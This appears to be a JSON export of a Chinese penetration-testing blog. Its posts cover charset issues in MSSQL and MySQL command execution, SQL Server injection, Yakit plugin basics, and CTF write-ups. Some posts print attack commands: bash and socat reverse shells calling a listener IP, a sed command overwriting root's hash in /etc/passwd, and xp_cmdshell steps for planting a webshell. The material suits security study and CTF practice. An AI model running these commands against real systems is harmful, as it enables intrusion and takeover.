[{"title":"数据库提权中的字符集挑战","path":"/posts/5ae37a88/","content":"在数据库渗透测试中，成功获取数据库权限后，下一步往往是通过数据库提权来执行系统命令，进而获得更高级别的系统访问权限。然而，在这个过程中，字符集兼容性问题经常被忽视，于是便有了本篇文章。 本篇文章以Windows中文环境下MSSQL和MySQL两种数据库提权为案例 前言数据库提权调用无论是MSSQL还是MySQL，当我们通过数据库执行系统命令时，实际上都是在调用操作系统的命令行接口。如图所示，当我们在数据库中执行ping命令时： MSSQL .xitzapubekic{zoom:50%;} MySQL: .bheghxbmnibl{zoom: 50%;} 在提权过程中所有的系统命令最终都要通过操作系统的命令行解释器来执行。在中文Windows系统环境下，提权便调用了cmd.exe 字符集Windows查询命令行解释器的字符集 chcp 命令 例如，这里的代码页 936 表示简体中文（GB2312） cmd程序属性 .hruiaonrhmdi{zoom:50%;} 在中文Windows系统环境下，cmd.exe默认使用GBK字符集进行输入输出处理，这意味着： 从数据库传递给cmd的命令参数必须是GBK编码 cmd执行结果的输出也是GBK编码 如果字符集不匹配，就会出现乱码或命令执行失败 排坑指南接下来介绍在渗透过程由于GBK字符集遇到以下情况的解决办法 命令参数包含中文路径时执行失败 输出结果乱码无法正确解析 …… .ouvgwtdghviz{zoom:50%;} MSSQL盲注提权环境背景在针对基于IIS + ASP.NET + MSSQL架构的Web应用进行渗透测试时，发现存在SQL注入漏洞，环境情况如下: 注入类型: 布尔盲注、堆叠注入 环境限制: 不出网、仅暴露80443端口 权限状况: 数据库用户为sysadmin，执行命令权限为nt authority\\system 系统环境: 中文Windows Server 为了后续方便内网渗透需要写入一个Webshell 流程大体流程如下： 创建临时表存储命令执行结果 利用堆叠执行系统命令，将结果插入临时表 通过盲注获取网站物理路径 写入Webshell到网站目录 寻找网站根路径根据权限级别，我们有不同的命令选择： 高权限情况下： c:\\windows\\system32\\inetsrv\\appcmd list vdirtype C:\\Windows\\System32\\inetsrv\\Config\\applicationHost.config | find physicalPath 一般权限情况下： dir C:\\ /s /b | find [替换为网站已有的静态文件] 踩坑01：寻找网站根路径中文路径的乱码问题 问题现象: 包含中文路径的配置无法正确显示，返回的结果出现乱码。 当我们执行以下命令时： exec master..xp_cmdshell type C:\\Windows\\System32\\inetsrv\\Config\\applicationHost.config | find \\physicalPath\\ 根本原因: applicationHost.config文件使用UTF-8编码保存，但CMD使用GBK字符集解码，导致中文字符显示为乱码 解决方案: 使用CyberChef等工具，通过”Encode text” → “Encode text”的recipe来恢复正确的中文字符。 盲注中的非ASCII字符处理在SQL Server中，ASCII()函数无法正确处理非ASCII字符： SELECT ASCII(P) AS [ASCII], ASCII(中) AS [Chinese]; .suqiryxjpdjs{zoom:67%;} 可以看到ASCII()函数无法正确映射非ASCII字符到正确的字符码位 SELECT NCHAR(80) AS [CHARACTER], NCHAR(214) AS [CHARACTER]; .xrwxnmihkudl{zoom:50%;} 解决思路1 - 使用UNICODE函数： UNICODE函数支持返回正确的字符码位，可以通过使用它来找到非ASCII字符的正确码位。并可通过NCHAR函数恢复为字符 SELECT UNICODE(中) AS [Unicode_Value]; .lszrjymqvtml{zoom:50%;} SELECT NCHAR(20013) AS [Character]; .hfcxddehbdwt{zoom:50%;} 解决思路2 - 十六进制转换： SELECT CONVERT ( VARCHAR (MAX), CONVERT ( varbinary (MAX), ( SELECT entry_value FROM daily_back WHERE id = 1 ) ), 2 ); 这种方法将中文字符转换为十六进制，通过盲注逐个字节读取，再通过CyberChef恢复原始字符。 sqlmap os-shell.fybbtvkbufrf{zoom:50%;} 那我用SQLMAP就没啥坑了吧？有的兄弟有的 使用sqlmap的os-shell功能时，同样会遇到字符集问题，出现中文会执行失败： .ujyoeytkedtm{zoom:50%;} 为什么会这样呢？补充个参数--proxy http://127.0.0.1:8080，用bp抓个包分析一下 依旧执行dir C:\\inetpub\\中文路径 命令 解码得到 DECLARE @gqxz VARCHAR(8000);SET @gqxz=0x64697220433a5c696e65747075625ce4b8ade69687e8b7afe5be84;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @gqxz-- 将0x64697220433a5c696e65747075625ce4b8ade69687e8b7afe5be84通过CyberChef解码一下，发现是默认的UTF8编码的命令 所以我们可以得到包含中文的命令执行失败原因为：SQLMAP的os-shell会自动将字符出使用UTF8编码，并直接输入xp_cmdshell 但CMD使用GBK解码导致乱码，执行失败 解决办法: 遇到包含中文的命令时，改用sqlmap的sql-shell直接执行： exec master..xp_cmdshell xxxxx MySQL UDF提权输出结果编码错误在中文Windows环境下MySQL UDF提权中，最常见的问题是执行结果的编码问题： SELECT sys_eval(dir E:\\\\); .trkuizofbkls{zoom: 50%;} 对应的解决办法很简单，udf函数外加一层编码转化的函数 SELECT CONVERT(sys_eval(dir E:\\\\) USING gbk); .oisubqmpfluj{zoom: 50%;} 命令中的非ASCII字符处理当命令参数包含中文，由于MySQL输入会根据默认字符集(utf8mb4latin1)编码对应的命令进入命令行解释器 SELECT CONVERT(sys_eval(dir E:\\\\附件) USING gbk); .splxfxypvbzn{zoom:50%;} 解决方案 方法1 - 十六进制编码: 使用CyberChef将命令转换为对应编码的十六进制 .iwktbwggvbev{zoom:50%;} 然后使用十六进制替代原有的字符串，防止MySQL因为默认编码问题导致的含有中文命令执行错误问题 .ybjcxdtdwibg{zoom:50%;} 方法2 - 编码函数: 既然又是编码问题，那再次使用MySQL的编码转化的函数不就好了吗？何必转成16进制这么麻烦 SELECT CONVERT(sys_eval(CONVERT(dir E:\\\\附件 USING gbk)) USING gbk); .shtdqgkflbvd{zoom:50%;} 总结总是遇到这种奇奇怪怪的问题。。。。 字符集问题在数据库渗透测试中往往被忽视，在Windows环境下应当格外注意","tags":["database","character"],"categories":["penetration"]},{"title":"Yakit插件开发","path":"/posts/72baa392/","content":"Yak语言基础 Yakit使用的是Yak语言，所以在写插件之前需要学习一下Yak语言（感觉比较像Python和JavaScript） 变量与数据类型变量Yak中赋值符为：= 定义变量 使用var作为关键词，var后使用空格作为分隔符即可定义变量 var a // 声明变量avar b, c // 声明变量b和cvar d, e = 1, 2 // 声明变量d和e，并分别赋值为1和2 在没有var修饰的时候，赋值符“”会为左边的“标识符”自动创建一个变量 基础数据类型 int：表示可以带正负号的整数数据类型（在Yak语言中占用的大小为64位）； string：用于表示一系列字符数据的，字符串中可以使用转义字符，例如 等； float：用于表示浮点数； byte：等同于“无符号8位整数”，通常用来表示一个“字节”，类似C语言中的Char类型； nil与undefined一般用于表示一个未定义的变量或者空值； bool：表示“布尔值”，其值只有两种情况，true或false； Tips: 声明一个非十进制的整数 // 二进制声明a = 0b10\t// a赋值2// 八进制声明b = 0100\t// b赋值64// 十六进制声明d = 0x10\t// d赋值16 多行文本 可以使用``(反引号)来定义多行文本，此时会忽略文本中的转义符号 abc = `Hello World Hello Yak`println(abc)/*Output:Hello World Hello Yak*/ 格式化字符串 Yak语言使用%进行基本的字符串格式化。格式化字符串的两种用法和操作基本语法： printf函数：第一个参数为需要格式化的字符串模版，其余参数为为格式化字符串中的参数； %格式化操作符： %左边为需要格式化的模版，右边为一个格式化字符串的参数，例如 Hello %v % World； 如果有多个需要格式化的点，那么需要使用 []来包裹，并用逗号分隔元素，例如：My name is %v, I am %d years old % [John, 18]。 示例： printf(Hello I am %d years old , 18)println(Hello %v + %05d % [World, 4])/*OUTPUT:Hello I am 18 years oldHello World + 00004*/ 格式化字符串中的占位符 字符串中的占位符 解释 %v 根据变量的类型自动选择格式。 %T 输出变量的类型。 %d 十进制整数。 %b 二进制整数。 %o 八进制整数。 %x 十六进制整数，使用小写字母。 %X 十六进制整数，使用大写字母。 %f 浮点数，不带指数部分。 %c ASCII码对应的字符。 %q 带引号的字符或字符串。 %s 字符串。 %p 输出十六进制表示的内存地址或引用。 字符串模版字面量 ​\t类似于Python，在字符串的前面加上一个小写的 f，然后在字符串内部用 $ 包裹需要插入的表达式。 示例：字符串中插入变量 a 和 name 的值。 println(f`Hello $a, Hello $name`) 其他数据类型列表类型：List在 Yak 语言中，List 是一种动态数组，它可以存储和管理相同类型的元素。Yak 语言支持字面量声明和 make 语法来创建 List 字面量创建列表：使用 [var1, var2, var3...] 形式快速声明一个 List。Yak 语言会根据列表内的元素类型自动推断合适的 List 类型。 **字典类型：**map字典用于存储键值对 字面量创建字典示例： m = a: 1, b: 2 **通道类型：**channel通道类型用于多线程之间的数据共享 创建与声明：使用make函数来创建一个新的channel。这就像是开设一个新的邮局，用于发送和接收包裹。 ch := make(chan int) // 创建一个没有存储空间的int类型的channelch2 := make(chan var, 2) // 创建一个有2个存储空间的var类型的channel 数据写入 ch - 1 // 将一个整数1寄出到ch，但是因为 ch 在上文创建时没有声明存储空间，这里会阻塞ch2 - a // 将一个字符串寄出到ch2ch2 - 0 // 将一个整数0寄出到ch2 读取数据 v := -ch // 从ch取走一个包裹 Tips：判断数据是否取走 v, ok := -chif ok println(取走成功，值为:, v) else println(邮局已关闭) Channel的属性 Yak提供了一些内置的函数来检查channel的当前状态。 len(ch2) // 查看ch2中还有多少个包裹cap(ch2) // 查看ch2最多能存放多少个包裹 关闭Channel 关闭后的channel不能再寄出数据，但仍然可以从中取走数据。 close(ch2) 运算符数学运算数学运算包括加、减、乘、除和取余等操作： println(2 + 2) // 输出: 4println(50 - 5*6) // 输出: 20println(8 / 5) // 输出: 1println(17 % 3) // 输出: 2 逻辑运算符逻辑运算符在Yak语言中用于进行逻辑操作，包括逻辑与()和逻辑或(||) 这两个运算符都具有短路特性，即如果左侧的操作数已经能确定整个表达式的值，那么就不会再计算右侧的操作数 a = trueb = falseprintln(a b) // 输出：falseprintln(a || b) // 输出：true 三元逻辑运算符形式为condition ? value1 : value2 如果condition为真，则表达式的结果为value1，否则为value2。这个运算符也具有短路特性，即如果条件已经能确定整个表达式的值，那么就不会再计算其他的值。以下是一些使用示例： a = 5b = 3result = a b ? a : bprintln(result) // 输出：5 控制与循环 这部分比较像Python，直接写示例就好了 条件判断示例： x = 88; // 学生的成绩if x = 90 print(非常优秀); else if x = 80 print(优秀); else if x = 70 print(良好); else if x = 60 print(普通); else print(不及格); SWITCH 语句示例： grade = Bswitch (grade) case A: println(优秀); case B: println(良好); case C: println(合格); case D: println(需要努力); default: println(无效的成绩); 此外，switch允许一个case分支匹配多个值 For循环定义： for 表达式1 ; 表达式2 ; 表达式3 循环体 首先运行表达式1 - 判断表达式2，如果成立则运行循环体中的代码 - 每一次循环后执行表达式3 - 进行表达式2的判断并循环执行，直到表达式2判断为假，则结束整个函数。 TIPS： 简化的For循环 对于无初始化表达式和每次循环后的迭代表达式的for循环，可以写为： for 布尔表达式 循环体 遍历列表 使用for-range与使用for-in效果相同 for i, v = range a println(i, v)//等同于for v in a println(v)/*OUTPUT:0 a1 b2 c3 d*/ i, v是我们在每次迭代中定义的两个变量，其中i将存储当前的索引，而v将存储与该索引对应的值（若只迭代一个变量，迭代的值将会是索引）。 range a是一个表达式，它创建了一个从集合a中提取索引和值的范围。 遍历字典 使用for-rangefor-in遍历字典，这样可以同时获取键和值： for k, v = range b printf(%s:%d, , k, v)//等同于for k, v in b printf(%s:%d, , k, v) 在这个循环中，k和v分别在每次迭代时被赋予字典中的键和对应的值 遍历通道 遍历通道中的数据可以使用for-rangefor-in语句来实现这一点： for result = range ch // 遍历通道内的数据 println(fetch chan var [ch] element: , result)//等同于for result in ch // 遍历通道内的数据 println(fetch chan var [ch] element: , result) 直接指定循环次数 for in n // 循环体将执行n次 如需当前的索引： for i in n // 可以使用变量i，它从0开始，直到n-1 或使用range关键字： for range n // 循环体将执行n次 如果需要索引，可以将i和range一起使用（注意：range 前有一个 =）： for i = range n // 可以使用变量i，它从0开始，直到n-1 插件Yakit的插件基本可以分成三种类型：交互式插件(Yak原生插件)、MITM 插件、Codec插件 交互式插件类似于单开一个功能页面 MITM 插件用于被动扫描时对漏洞进行检测 Codec插件用于对数据包进行操作，可以设置右键调用，对HTTP数据进行变形 APIYakit插件编写提供的API API手册 | Yak Program Language 几个比较经常用到的API https://yaklang.com/api-manual/api/cli (用于输入插件所需的数据) https://yaklang.com/api-manual/api/codec (Crypto等操作) https://yaklang.com/api-manual/api/poc (获得、修改数据包等操作)","tags":["Tolls-Dev"],"categories":["tools"]},{"title":"YunJing-GreatWall2024","path":"/posts/6949a71/","content":""},{"title":"SQL Server下SQL注入的应用","path":"/posts/e85eefb/","content":"写这篇文章的原因是在某次HVV期间遇到了个ASP.NET站点搭配使用了Microsoft Sql Server,于是想总结一下SQLI在SQLServer中的一些姿势 权限判断Tips：判断能否堆叠判断是否能堆叠注入可以使用下面语句作为堆叠的语句，人为设置响应延迟与正常响应时间进行对比从而判断第二个语句是否被执行 WAITFOR DELAY 00:00:05; -- 执行暂停 5 秒钟 若响应时间大于设置的延迟说明第二个语句被执行 若存在堆叠，还可以根据延迟的时间判断传入的这个参数被多少句SQL语句中使用 判断站库分离 站库分离：网站程序和数据库分别放在了不同的服务器上 判断站库分离可以通过判断客户端主机名和服务端主机名是否一致进而判断是否为站库分离 获取客户端主机名 SELECT host_name(); 获取服务端主机名 SELECT @@servername;SELECT serverproperty(MachineName); 若客户端主机名与服务端主机名一致则站库不分离，不一致则站库分离 在进行判断时可以在注入点后添加条件,若条件为真则站库不分离 AND host_name()=@@servername 查找站点路径可以通过IIS的配置文件applicationHost.config C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config 处理中文SQL Server中ASCII ()函数进行了说明👉ASCII (Transact-SQL) - SQL Server | Microsoft Learn ASCII 是一个 7 位字符集。 扩展的 ASCII（或称 High ASCII）是不由 ASCII 函数处理的 8 位字符集， ASCII 函数能够读取前 7 位的流，而不包括剩余的 1 位。 UNICODE 函数支持返回正确的字符码位，可以通过使用它来找到字符 æ 的正确码位。并可通过NCHAR函数恢复为字符 但值得注意的是在 SQL Server 中，字符串字面量默认使用数据库的默认字符集进行处理，在遇到数据库使用字符集中不存在字符时，无论使用 UNICODE 函数还是转化为16进制依旧会转化成非预期结果 并且一旦写入数据库，即使使用 如：CAST(MyColumn AS nvarchar(MAX)) 将 列 MyColumn 显式地转换为 nvarchar 类型也无法恢复 [!TIP] 若需要在不改变数据库的默认字符集情况下，能使用UNICODE 函数或转16进制时正确转化，建议大家这里根据情况将需要读的列设置为 nvarchar 类型 例如：在字符集Chinese_PRC_CI_AS下 SELECT UNICODE(æ) 结果为63而非230 在设置列为nvarchar 类型的前提下，对于中文的处理可以使用以下方式 将中文使用转化为UNICODE函数转化，再通过NCHAR函数恢复为中文 例如： SELECT UNICODE(SUBSTRING((SELECT entry_value FROM daily_back WHERE id = 16), 1, 1)) 将中文转化为16进制，再通过CyberChef的Recipe为From Hex - Decode text编码方式选择为UTF-16LE恢复为中文 例如： SELECT CONVERT(varchar(max), CONVERT(varbinary(max), (SELECT entry_value FROM daily_back WHERE id = 16)), 2); 由于中文对应的UNICODE会很大很大，这里更推荐使用16进制进行。不嫌麻烦也可以把UNICODE转化为十六进制","tags":["CTF-Web","Web-SQL"],"categories":["web"]},{"title":"春秋云镜-Certify","path":"/posts/c964b814/","content":"Certify 靶标介绍： Certify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 ██████ ██ ██ ████ ██░░░░██ ░██ ░░ ░██░ ██ ██ ██ ░░ █████ ██████ ██████ ██ ██████ ░░██ ██ ░██ ██░░░██░░██░░█░░░██░ ░██░░░██░ ░░███ ░██ ░███████ ░██ ░ ░██ ░██ ░██ ░██ ░░██ ██░██░░░░ ░██ ░██ ░██ ░██ ██ ░░██████ ░░██████░███ ░░██ ░██ ░██ ██ ░░░░░░ ░░░░░░ ░░░ ░░ ░░ ░░ ░░ 老习惯 ________ _______ ________ _________ ___ ________ ___ ___ |\\ ____\\|\\ ___ \\ |\\ __ \\|\\___ ___\\\\ \\|\\ _____\\\\ \\ / /|\\ \\ \\___|\\ \\ __/|\\ \\ \\|\\ \\|___ \\ \\_\\ \\ \\ \\ \\__/\\ \\ \\/ / / \\ \\ \\ \\ \\ \\_|/_\\ \\ _ _\\ \\ \\ \\ \\ \\ \\ \\ __\\\\ \\ / / \\ \\ \\____\\ \\ \\_|\\ \\ \\ \\\\ \\| \\ \\ \\ \\ \\ \\ \\ \\_| \\/ / / \\ \\_______\\ \\_______\\ \\__\\\\ _\\ \\ \\__\\ \\ \\__\\ \\__\\__/ / / \\|_______|\\|_______|\\|__|\\|__| \\|__| \\|__|\\|__|\\___/ / \\|___|/ flag02: flag04484084-cc7b-40d2-8be1-fabd519f22a5Yes, you have enumerated smb. But do you know what an SPN is?","categories":["WriteUp"]},{"title":"Webshell提权","path":"/posts/6f44101f/","content":"SUID提权简介在Linux中suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件 题目[湖湘杯 2021 final]Penetratable 这题很有渗透的感觉，建议当成渗透题目来做 可以先扫描一下 ┌──(wells㉿XiaoWEI)-[~]└─$ sudo dirsearch -u http://node4.anna.nssctf.cn:28571//usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460Output File: /home/wells/reports/http_node4.anna.nssctf.cn_28571/__25-03-27_21-36-09.txtTarget: http://node4.anna.nssctf.cn:28571/[21:36:09] Starting:[21:36:14] 403 - 288B - /.ht_wsr.txt[21:36:14] 403 - 288B - /.htaccess.bak1[21:36:14] 403 - 288B - /.htaccess.orig[21:36:14] 403 - 288B - /.htaccess_extra[21:36:14] 403 - 288B - /.htaccess.sample[21:36:14] 403 - 288B - /.htaccess.save[21:36:14] 403 - 288B - /.htaccessBAK[21:36:14] 403 - 288B - /.htaccess_sc[21:36:14] 403 - 288B - /.htaccess_orig[21:36:14] 403 - 288B - /.htaccessOLD[21:36:14] 403 - 288B - /.htaccessOLD2[21:36:14] 403 - 288B - /.htm[21:36:14] 403 - 288B - /.html[21:36:14] 403 - 288B - /.htpasswds[21:36:14] 403 - 288B - /.httr-oauth[21:36:14] 403 - 288B - /.htpasswd_test[21:36:15] 403 - 288B - /.php[21:36:28] 301 - 335B - /app - http://node4.anna.nssctf.cn:28571/app/[21:36:28] 200 - 520B - /app/[21:36:33] 301 - 338B - /config - http://node4.anna.nssctf.cn:28571/config/[21:36:33] 200 - 487B - /config/[21:36:53] 200 - 0B - /phpinfo.php[21:36:59] 403 - 288B - /server-status/[21:36:59] 403 - 288B - /server-status[21:37:03] 301 - 338B - /static - http://node4.anna.nssctf.cn:28571/static/ 有一个phpinfo.php但直接访问没有任何东西 回到主题页面来 通过修改id参数可以知道有两个用户一个root一个admin，尝试构造注入等也没有任何收获 在findsomething中能找到已知的路由 /?c=admin/?c=adminm=updatePass/?c=appm=login/?c=appm=register/?c=appm=signOut/?c=root/?c=rootm=downloadRequestLogfilename=/?c=rootm=getLogList/?c=rootm=getUserInfo/?c=user/?c=userm=updateUserInfo 尝试直接登录/?c=admin和/?c=root会提示没有权限 尝试注册一个正常的用户，登录进去后会发现有修改密码的功能 这里可以修改自己的密码，想越权到修改其他用户的密码 尝试抓包修改 发现成功修改admin的密码，但在修改root的时候被提示没有权限 这里猜测可以通过/?c=adminm=updatePass这个路由进行修改root用户的密码 登录admin用户，查看/?c=adminm=updatePass中所需要的参数 /static/js/req.js function updatePass() // let name=encodeURIComponent(Base64.encode($(.input-groupinput).eq(0).val())) // let oldPass=$(.input-groupinput).eq(1).val()?hex_md5($(.input-groupinput).eq(1).val()):; // let newPass=$(.input-groupinput).eq(2).val()?hex_md5($(.input-groupinput).eq(2).val()):; // let saying=encodeURIComponent(Base64.encode($(.input-groupinput).eq(3).val())) // $.ajax( // url: /?c=adminm=updatePass, // type: post, // data: name=+name+newPass=+newPass+oldPass=+oldPass+saying=+saying, // // async:true, // dataType: text, // success: function(data) // alertHandle(data); // // ); 尝试使用这个被注释的路由，通过这个路由成功修改root的密码 登录进root的面板发现有个log的文件，与/?c=rootm=downloadRequestLogfilename=与之对应，发现有个目录穿越，发现在根目录有flag文件但无法读取，应该是需要提权的 这边犯傻了，把所有文件都看了一遍还以为在主体代码有什么rce漏洞，后面才注意到最开始扫到的phpinfo.php这个文件。。。 通过CMD5查询到Webshell的密码为1q2w3e 反弹个shell后查看一下flag的文件权限 -r-------- 1 root root 45 Mar 27 15:20 flag 看来是要提权，先看一下suid提权 www-data@6aae652213e24b63:/var/www/html$ find / -perm -u=s -type f 2/dev/null/bin/su/bin/sed/bin/umount/bin/mount/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/gpasswd/usr/bin/chfn/usr/lib/openssh/ssh-keysign 发现有sed，尝试使用sed替换/etc/passwd中密码的部分 www-data@6aae652213e24b63:/var/www/html$ perl -le print crypt(test,addedsalt)adMpHktIn0tR2www-data@6aae652213e24b63:/var/www/html$ sed -i s/root:x/root:adMpHktIn0tR2/g /etc/passwdwww-data@6aae652213e24b63:/var/www/html$ suPassword: root@6aae652213e24b63:/var/www/html# cat /flagNSSCTF689a8f95-ec99-490e-8dbf-65f9df21d716 SUDO提权sudo -l https://gtfobins.github.io/ CVE提权SUDO CVECVE-2021-3156影响范围 1.8.21.8.31p2下的所有旧版本sudo，以及1.9.01.9.5p1的所有稳定版sudo exp https://github.com/Rvn0xsy/CVE-2021-3156-plus# 例子 [NSSRound#18 Basic]Becomeroot","categories":["penetration"]},{"title":"简单shell升级交互式","path":"/posts/a75a4ee7/","content":"由于脚本语言默认执行系统命令时，是没有获取 tty 的 当Webshell反弹到服务器上时经常都是非交互式的，具体表现为控制符变成了转义序列。在某些时候就很难下一步操作了，比如需要使用vim时显示一堆的控制符，在Ctrl+C时却退出了Shell 升级Shell为交换式的小Tip：python pty 方式 前提条件是目标主机上需要有python 查看监听服务器终端和STTY信息 root@localhost:~# echo $TERM xtermroot@localhost:~# stty -a speed 38400 baud; rows 47; columns 160; line = 0;intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = undef; eol2 = undef; swtch = undef; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;lnext = ^V; discard = ^O; min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc 这里我们的终端信息为xterm，stty的行数(rows)为47，列数(columns)为160 在监听服务器开启监听 root@localhost:~# nc -lvp 8077Listening on 0.0.0.0 8077 在目标机器执行反弹shell命令 bash -i /dev/tcp/192.168.1.1/8077 01 这里我们反弹的shell为bash，此时监听服务器收到了反弹的shell root@ctf:~# nc -lvp 8077Listening on 0.0.0.0 8077Connection received on 1.14.71.254 36490bash: cannot set terminal process group (432): Inappropriate ioctl for devicebash: no job control in this shellwww-data@09010c0e86d04512:/var/www/html$ 启用python交互式 www-data@09010c0e86d04512:/var/www/html$ python3 -c import pty; pty.spawn(/bin/bash)ml$ python3 -c import pty; pty.spawn(/bin/bash) 按下Ctrl+Z，后台挂起 刷新终端 root@ctf:~$ stty raw -echo root@ctf:~$ fg #这个指令输入的时候不会回显www-data@09010c0e86d04512:/var/www/html$ reset 可能这时候就会有如下的提示询问终端类型，此时就可以直接输入终端信息然后回车 reset: unknown terminal type unknownTerminal type? 若无提示需要设置 www-data@6aae652213e24b63:/var/www/html$ export TERM=xterm 根据自己的终端信息设置如下参数 $ export SHELL=bash$ stty rows 47 columns 160 socat 反弹Shell socat的可执行文件可以从https://github.com/3ndG4me/socat/releases下载 在监听服务器开启监听 $ socat file:`tty`,raw,echo=0 tcp-listen:8088 这里的9999为监听的端口 把socat可执行文件上传到目标机器上，然后执行： user@414e07ee65d84196:~$ ./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:111.111.111.111:8088 其中111.111.111.111:9999为监听服务器的IP和端口","categories":["tips"]},{"title":"春秋云镜-MagicRelay","path":"/posts/8dd8445/","content":"MagicRelay 靶标介绍： Legacy Network 是一家在信息技术领域拥有 20 年历史的老牌企业，专注于为中小型公司提供IT解决方案和支持服务。由于长期依赖于过时的基础设施和内部网络，Legacy Network 在现代化的安全防护体系方面存在许多不足，特别是在权限控制、过时的软件、未及时更新补丁等方面存在显著问题。你的目标是通过渗透进入该网络，获取每台机器的权限，该靶场共有 4个Flag，分布于不同的靶机。","categories":["WriteUp"]},{"title":"2024ImaginaryCtf-WEB复盘","path":"/posts/25584ce3/","content":"靶场链接：https://2024.imaginaryctf.org/ 官方WP指路：https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/tree/main/Web readme (100 pts) - 978 solves by maple3142 Description Try to read the flag.txt file. 附件：点击下载附件 先看dockerfile(虽然flag在这边露出来了)，这是个node后端+nginx的配置 FROM node:20-bookworm-slimRUN apt-get update \\ apt-get install -y nginx tini \\ apt-get clean \\ rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*WORKDIR /appCOPY package.json yarn.lock ./RUN yarn install --frozen-lockfileCOPY src ./srcCOPY public ./publicCOPY default.conf /etc/nginx/sites-available/defaultCOPY start.sh /start.shENV FLAG=ictfpath_normalization_to_the_rescueENTRYPOINT [/usr/bin/tini, --]CMD [/start.sh] 可以知道flag放置在/app/public文件夹下，然后几个比较关键的文件 default.conf server listen 80 default_server; listen [::]:80; root /app/public; location / #检测url是否在/app/public文件夹下存在这个文件，如果存在返回404 if (-f $request_filename) return 404; proxy_pass http://localhost:8000; /src/app.js const express = require(express)const path = require(path)const app = express()app.use(express.static(path.join(__dirname, ../public)))app.listen(8000) 所以这道题目很明显的目的就是要绕过nginx的文件检测if (-f $request_filename)，但要在node的这个web程序中能被读取 一通乱尝试 原理分析 readme2 (249 pts) - 56 solves by maple3142 Description Try to read the flag.txt file, again! 附件：点击下载附件 ok这题不是自己想出来的，以后一定好好看官方文档，原文指路：readme2 | siunam’s Website 附件里的内容很简单，从dockerfile可以知道是使用bun.js起的后端服务 什么是bun？Bun — A fast all-in-one JavaScript runtime app.js const flag = process.env.FLAG || ictfthis_is_a_fake_flagBun.serve(\tasync fetch(req) const url = new URL(req.url) if (url.pathname === /) return new Response(Hello, World!) if (url.pathname.startsWith(/flag.txt)) return new Response(flag) return new Response(`404 Not Found: $url.pathname`, status: 404 )\t,\tport: 3000)Bun.serve(\tasync fetch(req) if (req.url.includes(flag)) return new Response(Nope, status: 403 ) const headerContainsFlag = [...req.headers.entries()].some(([k, v]) = k.includes(flag) || v.includes(flag)) if (headerContainsFlag) return new Response(Nope, status: 403 ) const url = new URL(req.url) if (url.href.includes(flag)) return new Response(Nope, status: 403 ) return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body )\t,\tport: 4000 // only this port are exposed to the public) 读app.js可以知道后端起了两个服务，对外开放的是4000端口，很明显想要拿到flag，最终需要通过4000端口，访问到3000端口，且url开头以flag.txt。 思路一： 利用host最开始尝试想能不能利用请求头host，并通过/..最终绕过检测，发现 特性1： 自动处理/..穿梭至上一级url处传入 会发现双/test消失，原因为第1次传入后，url由于有..所以，所以第一次的url的pathname部分只剩下/，如下图 特性2： url属性是请求包host+get参数的结果最终传入3000端口的url的pathname变成了/test/test 原因：通过代码最后一段可以发现 return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body) host被原样传入，由于 const url = new URL(req.url)new URL(url.pathname + url.search, http://localhost:3000/) 但此时url的pathname处以及有了一个/test所以最后pathname出现双/test 特性3：通过拼接的url会自动省略 \\t（tab键）发送的请求包如下 在传入后获得的url为 发现\\t被自动忽略了 由于在对于/..的处理是在程序运行前，所以可以进行搭配 分析一波 第一次传入后，url为localhost:8100/flag.txt/..(\\t被自动省略)，此时还会自动处理/..,所以第一次的url为localhost:8100/，host中的\\t不会被自动忽略，所以第一次检测的所有部分都不含有flag，且通过req.url出的url也不含flag if (req.url.includes(flag)) return new Response(Nope, status: 403 ) const headerContainsFlag = [...req.headers.entries()].some(([k, v]) = k.includes(flag) || v.includes(flag)) if (headerContainsFlag) return new Response(Nope, status: 403 ) const url = new URL(req.url) if (url.href.includes(flag)) return new Response(Nope, status: 403 ) 但由于 return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body) 此时host会原封不动的传给3000端口，此时url变为http://localhost:3000/flag.txt/,满足获得flag的条件 即可获得flag 思路二： 利用URL api这里实际可以利用的地方就是调用的URL api(文档指路：URL - Web API | MDN (mozilla.org)),破坏原本的url，将http://localhost:3000/修改为自定义的网址,发现fetch()是会跟随重定向的，再利用302重定向至http://localhost:3000/flag.txt 起一个简单的重定向服务 ?phpheader(Location: http://localhost:3000/flag.txt)? 用法一：这里有个比较特殊的用法就是 new URL(//foo.com, https://example.com);// = https://foo.com/（见相对 URL） 即我们最终在 return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body) url.pathname 要以//开头，尝试直接以//传入，发现是可行的 用法二：new URL(http://www.example.com, https://developer.mozilla.org);// = http://www.example.com/ 使用这种方法，需要绕过http的固定格式 GET /urlpart HTTP/1.1 不能出现/，而且服务端不能报错，在discord上找到了这种方法 